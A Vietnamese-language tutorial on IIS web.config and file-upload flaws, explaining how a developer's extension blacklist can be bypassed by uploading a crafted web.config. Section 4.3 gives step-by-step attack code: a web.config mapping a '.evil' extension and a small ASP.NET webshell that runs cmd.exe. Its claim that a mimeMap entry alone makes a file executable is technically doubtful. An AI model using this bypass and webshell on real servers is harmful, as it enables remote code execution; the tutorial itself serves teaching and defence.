# 1. web.config TRONG IIS LÀ GÌ?

Trong IIS (Internet Information Services) của Microsoft:

**web.config** là file cấu hình theo từng thư mục

- Chức năng tương đương `.htaccess` của Apache
- Cho phép ghi đè hoặc bổ sung cấu hình toàn cục

👉 IIS sẽ tự động đọc `web.config` nếu file tồn tại trong thư mục được truy cập.

# 2. GIẢI THÍCH ĐOẠN CẤU HÌNH ĐƯỢC NÊU

```xml
<staticContent>
    <mimeMap fileExtension=".json" mimeType="application/json" />
</staticContent>
```

## 2.1. staticContent

- Phần cấu hình liên quan đến file tĩnh
- Quy định IIS xử lý các phần mở rộng file như thế nào

## 2.2. mimeMap

```xml
<mimeMap fileExtension=".json" mimeType="application/json" />
```

**Ý nghĩa:**

Khi người dùng truy cập file `.json`

IIS sẽ gửi response với header:

`Content-Type: application/json`

➡️ Bình thường, cấu hình này vô hại
➡️ Chỉ dùng để cho phép tải file JSON

# 3. VÌ SAO web.config LIÊN QUAN ĐẾN LỖ HỔNG FILE UPLOAD?

❗ Vấn đề không nằm ở MIME JSON,
❗ mà nằm ở việc IIS cho phép upload `web.config`

## 3.1. Cơ chế nguy hiểm

IIS:

❌ Không cho truy cập `web.config` qua HTTP

✅ Nhưng vẫn đọc & thực thi cấu hình bên trong

Nếu attacker upload được `web.config`:

IIS tự động áp dụng cấu hình đó

➡️ Đây chính là điểm chết người

# 4. KỊCH BẢN LỖ HỔNG FILE UPLOAD TRÊN IIS

## 4.1. Điều kiện

Website cho phép upload file

Không chặn:

- `web.config`
- hoặc chỉ blacklist `.aspx`, `.php`

Thư mục upload nằm trong webroot

## 4.2. Sai lầm phổ biến của dev

- Chặn: `.aspx`, `.php`
- Cho phép: `.jpg`, `.png`, `.txt`, `.json`

👉 Dev nghĩ:

“Không upload được .aspx thì an toàn”

❌ Sai hoàn toàn

## 4.3. Tấn công thực tế (STEP BY STEP)

### 🔹 Bước 1: Upload web.config

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <staticContent>
      <mimeMap fileExtension=".evil" mimeType="application/x-asp-net" />
    </staticContent>
  </system.webServer>
</configuration>
```

➡️ IIS hiểu:

File `.evil` = ASP.NET executable

### 🔹 Bước 2: Upload file độc hại

Tên file:

`shell.evil`

Nội dung:

```asp
<%@ Page Language="C#" %>
<%
  System.Diagnostics.Process.Start("cmd.exe", "/c whoami");
%>
```

### 🔹 Bước 3: Truy cập file

`http://victim.com/upload/shell.evil`

🔥 IIS thực thi code ASP.NET
🔥 Remote Code Execution

# 5. TẠI SAO CÓ THỂ BYPASS BLACKLIST?

❌ Dev chặn:

`.aspx`

✅ Nhưng attacker:

Dùng `.evil`, `.json`, `.txt`

Rồi tự ánh xạ MIME → executable

➡️ Blacklist extension hoàn toàn vô dụng
